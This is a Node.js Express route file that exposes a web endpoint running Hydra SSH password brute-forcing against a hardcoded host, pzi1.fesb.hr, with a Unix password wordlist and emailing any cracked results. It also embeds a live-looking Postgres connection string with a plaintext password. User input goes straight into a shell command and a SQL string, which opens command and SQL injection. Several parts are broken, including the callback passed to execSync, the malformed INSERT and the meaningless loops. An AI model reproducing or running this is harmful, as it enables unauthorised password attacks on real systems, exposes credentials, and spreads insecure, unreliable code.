const express = require("express");
const targetIP = "pzi1.fesb.hr";
const targetPORT = "22";
const wordlistPath = "./lists/unix_passwords.txt";

const execute = require("child_process").execSync;
const postgres = require("postgres");
const fs = require("fs");
require("dotenv").config();
var nodemailer = require("nodemailer");
const { setTimeout } = require("timers");

let router = express.Router();
const transport = nodemailer.createTransport({
  service: "outlook",
  auth: {
    user: "",
    pass: "", //place in .ENV!!
  },
});

const URL = `postgres://petarcelar7:WZQHnrVC2kI7@ep-tight-night-820122.eu-central-1.aws.neon.tech/neondb?options=project%3Dep-tight-night-820122`;
const sqlConnection = postgres(URL, { ssl: "require" });

async function addResult(username) {
  let addResultRecord = await sqlConnection(
    `INSERT INTO account(username, passw) VALUES ('${username}'`
  );
}

router.use(express.json());

router
  .route("/ssh")
  .get((req, res) => {})
  .post((req, res) => {
    console.log("Client connected");
    const username = req.body.username;
    const email = req.body.email;
    var isFinished = true
    execute(
      `hydra ${targetIP} ssh -l ${username} -P ${wordlistPath} -s ${targetPORT} -vV -o ./__data/hydra-result-${username}.json -b json`,
      (error, stdout, stderr) => {
        if (error) console.warn(error);
        // isFinished = false
        res
          .send(
            stdout +
              " for username " +
              `${username} ` +
              " on " +
              `${targetIP}` +
              ". You will receive results on e-mail provided. Made by @petarcelar" +
              "\n https://pjeppsi/hydraX"
          )
          .end();
        console.log("Action finished");
        // isFinished = true
      }
    );
    if(isFinished == true){
        const path = `../__data/hydra-result-${username}.json`;
        fs.access(path, fs.F_OK, (err) => {
            if (err) {
              while (err == true) {
                console.log("Trying again, Hydra is still working");
              }
              console.log("File now exists");
            }
          });
          fs.readFile(`../__data/hydra-result-${username}.json`, (err, data) => {
              if (err) {
                  while(err == true){
                      console.log("Waiting for hydra to finish...")
                  }
              }
              var result = JSON.stringify(data)
              let condition = result.results
              if (isObjEmpty(condition) == false) {
                  var resultFinal = JSON.stringify(condition)
                  var mailContent = {
                      from: "pcelar00@fesb.hr",
                      to: `${email}`,
                      subject: `HydraX scan report for ${username}`,
                      text: `${resultFinal}`,
                  };
                  transport.sendMail(mailContent, function (error, info) {
                      if (error) {
                        console.log(error);
                      } else {
                        console.log("Email sent" + info.response);
                      }
                  });
          }
          });
    }

    function isObjEmpty(obj) {
      return Object.keys(obj).length === 0;
    }
    
    
  });

module.exports = router;
